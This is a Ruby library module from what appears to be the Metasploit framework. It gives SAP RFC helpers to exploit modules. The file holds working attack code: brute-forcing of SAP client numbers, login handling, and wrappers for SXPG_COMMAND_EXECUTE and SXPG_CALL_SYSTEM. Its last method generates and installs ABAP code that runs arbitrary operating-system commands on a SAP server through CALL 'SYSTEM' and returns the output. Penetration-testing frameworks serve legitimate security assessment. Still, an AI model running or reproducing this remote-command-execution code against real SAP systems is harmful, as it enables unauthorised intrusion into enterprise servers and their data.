# -*- coding: binary -*-

###
#
# Common SAP methods
#
###

begin
  require 'nwrfc'
rescue LoadError
  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.\n[-] Try export LD_LIBRARY_PATH=/usr/sap/rfcsdk/lib:/usr/sap/nwrfcsdk/lib")
end


module Msf
module Exploit::SAP
module RFC

  include NWRFC

  def initialize(info = {})
    super
    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
      ], self.class)
  end

  def system_number(rport=nil)
    if rport
      rport.to_s[-2..-1]
    else
      datastore['RPORT'].to_s[-2..-1]
    end
  end

  def client
    datastore['CLIENT']
  end

  def rhost
    datastore['RHOST']
  end

  def rport
    datastore['RPORT']
  end

  def client_list
    if client.nil?
      print_status("Using default SAP client list")
      clients = ['000', '001', '066']
    else
      if client =~ /^\d{3},/
        clients = datastore['CLIENT'].split(/,/)
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}-\d{3}\z/
        array = client.split(/-/)
        clients = (array.at(0)..array.at(1)).to_a
        print_status("Brute forcing clients #{client}")
      elsif
        client =~ /^\d{3}\z/
        clients = [client]
        print_status("Brute forcing client #{client}")
      else
        print_status("Invalid CLIENT - using default SAP client list instead")
        clients = ['000', '001', '066']
      end
    end

    clients
  end

  def auth_hash(rhost, rport, client, username, password)
    ashost = rhost
    sysnr = system_number(rport)

    if datastore['SRHOST']
      ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
    end

    {"user" => username, "passwd" => password, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
  end

  def login(rhost, rport, client, username, password)
    conn = nil

    begin
      ah = auth_hash(rhost, rport, client, username, password)
      conn = Connection.new(ah)
      if (block_given?)
        begin
          yield conn
        ensure
          begin
            conn.disconnect if conn
          rescue
          end
        end
      else
        return conn
      end
    rescue NWError => e
      case e.code
      when :RFC_COMMUNICATION_FAILURE
        errno, errtext = parse_comm_exception(e)
        vprint_error("#{rhost}:#{rport} [SAP] #{e.code} - #{errtext}")
      else
        vprint_status("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end

      raise e
    end
  end

  def run_function(conn, function_name, opts)
    fc = nil

    function = conn.get_function(function_name)
    fc = function.get_function_call

    opts.each do |key,value|
      fc[key] = value
    end

    fc.invoke

    fc
  end

  def parse_comm_exception(exception)
    errno = nil
    errno_text = nil
    exception.message.each_line do |line|
      if line =~ /^ERRNO\s+(\d+)$/
        errno = $1
      elsif line =~ /^ERRNO TEXT\s+([\w ]+)$/
        errno_text = $1
      elsif line =~ /^ERROR\s+(.+)$/
        errno_text = $1
      end
    end

    return errno, errno_text
  end

  def sxpg_command_execute(conn, opts)
    fc = run_function(conn, "SXPG_COMMAND_EXECUTE", opts)
    data = ''
    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def sxpg_call_system(conn, opts)
    fc = run_function(conn, "SXPG_CALL_SYSTEM", opts)
    data = ''
    data_length = fc[:EXEC_PROTOCOL].size

    0.upto(data_length-1) do |i|
      data << fc[:EXEC_PROTOCOL][i][:MESSAGE] << "\n"
    end

    data
  end

  def rfc_abap_install_and_run(conn, code)
    conn.connection_info
    function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
    fc = function.get_function_call
    code.each_line do |line|
      fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
    end
    fc.invoke
    return fc[:WRITES]
  end

  def rfc_abap_install_and_run_cmd(conn, cmd)
    cmd = cmd.gsub("'","''")
    # TODO: Does encoding ' count towards the limit?
    raise RuntimeError, "Command is too large: #{cmd.length}" if cmd.length > 255
    code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.\r\n"
    code << "TYPES lt_line(255) TYPE c.\r\n"
    code << "DATA lv_cmd(#{cmd.length}) TYPE c.\r\n"
    code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE.\r\n"
    code << "lv_cmd =\r\n"

    # ensure that ' never occurs at the start or end of a line
    # TODO: Cant we just GSUB each line?
    bad_split = true
    n = 50
    a = []
    while bad_split do
      if n < 10
        raise RuntimeError, "Unable to split command correctly"
      end

      a = cmd.scan(/.{1,#{n}}/)
      a.each do |l|
        if l[0] == "'" || l[-1] == "'"
          n -= 1
          break
        end
      end

      bad_split = false
    end

    a.each do |line|
      if line == a.last
        code << "'#{line}'.\r\n"
      else
        code << "'#{line}'&\r\n"
      end
    end
    code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd\r\n"
    code << "ID 'TAB' FIELD lt_result-*sys*.\r\n"
    code << "LOOP AT lt_result.\r\n"
    code << "WRITE : / lt_result.\r\n"
    code << "ENDLOOP.\r\n"

    result = rfc_abap_install_and_run(conn, code)
    data = ''
    result.each do |row|
      data << row[:ZEILE] << "\n"
    end

    data
  end

end
end
end

